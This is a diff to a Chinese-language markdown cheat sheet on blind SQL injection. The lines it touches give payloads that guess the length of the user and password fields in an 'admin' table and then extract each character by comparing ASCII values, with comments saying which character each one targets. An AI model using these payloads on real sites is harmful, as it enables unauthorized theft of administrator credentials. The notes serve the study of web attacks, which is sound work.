@@ -18,6 +18,6 @@
 `and 1=(select top 1 len(user) from admin)` \
 `and 1=(select top 1 len(password) from admin)`
 ## 猜ascii值，再转成字符
-`and 1=(select top 1 asc(mid(user,1,1)) from admin)>96` 第一个user的第一个字符的ascii
-`and 1=(select top 1 asc(mid(user,2,1)) from admin)>55` 第一个user的第二个字符的ascii
+`and 1=(select top 1 asc(mid(user,1,1)) from admin)>96` 第一个user的第一个字符的ascii \
+`and 1=(select top 1 asc(mid(user,2,1)) from admin)>55` 第一个user的第二个字符的ascii \
 `and 1=(select top 1 asc(mid(password,1,1)) from admin)>100` 第一个user对应的密码的第一个字符
